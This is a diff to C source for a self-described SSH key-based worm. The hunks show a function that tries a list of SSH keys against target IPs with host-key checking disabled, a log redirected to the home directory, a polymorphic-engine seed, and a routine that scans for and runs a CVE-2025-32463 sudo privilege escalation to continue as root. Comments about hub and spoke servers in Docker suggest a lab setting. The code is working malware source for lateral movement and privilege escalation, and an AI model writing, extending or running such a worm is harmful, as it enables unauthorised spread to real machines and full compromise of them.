@@ -329,7 +329,7 @@ int infect_target(const char* ip, const char* argv0) {
         char ssh_cmd[4096];
         snprintf(ssh_cmd, sizeof(ssh_cmd),
             "ssh -o StrictHostKeyChecking=no -o ConnectTimeout=%d "
-            "-i %s %s@%s 'echo test' 2>/dev/null",
+            "-i %s %s@%s 2>/dev/null",
             SSH_TIMEOUT, SSH_KEY_LIST[i], SSH_USER, ip);
         
         int result = system(ssh_cmd);
@@ -542,7 +542,22 @@ void get_net_24(const char *ip, char *out) {
 
 int main(int argc, char* argv[]) {
     (void)argc;  // Suppress unused parameter warning
-    printf("=== C SSH Key-Based Worm ===\n");
+
+    // LOGGER: For debbuging, testing and For logs on each machine
+    char log_path[512];
+    snprintf(log_path, sizeof(log_path), "%s/worm.log", getenv("HOME"));
+
+    int fd = open(log_path, O_WRONLY | O_CREAT | O_TRUNC, 0600);
+    if (fd < 0) {
+        perror("open");
+        return 1;
+    }
+
+    dup2(fd, STDOUT_FILENO);
+    close(fd);
+
+    // Start
+    printf("\n=== C SSH Key-Based Worm ===\n\n");
     
     // Initialize random seed for polymorphic engine
     srand(time(NULL));
@@ -554,10 +569,9 @@ int main(int argc, char* argv[]) {
     // Spoke servers have vulnerable sudo installed, so we can detect them by checking for the vulnerability
     // This works better than hostname checking since Docker containers have random hostnames
 
-    printf("\n[*] Checking for CVE-2025-32463 (Sudo NSS Injection)...\n");
+    printf("[*] Checking for CVE-2025-32463...\n");
     if (cve_2025_32463_scan()) {
-        printf("[+] CVE-2025-32463 vulnerability detected! This appears to be a spoke server.\n");
-        printf("[+] Attempting privilege escalation...\n");
+        printf("[+] CVE-2025-32463 vulnerability detected. Attempting privilege escalation...\n");
         if (cve_2025_32463_execute()) {
             printf("[+] Privilege escalation successful! Continuing as root...\n");
         } else {
@@ -565,7 +579,6 @@ int main(int argc, char* argv[]) {
         }
     } else {
         printf("[-] CVE-2025-32463 not applicable (sudo version not vulnerable or not installed)\n");
-        printf("[*] This appears to be the hub server, skipping privilege escalation\n");
     }
 
     // Check if SSH keys exist
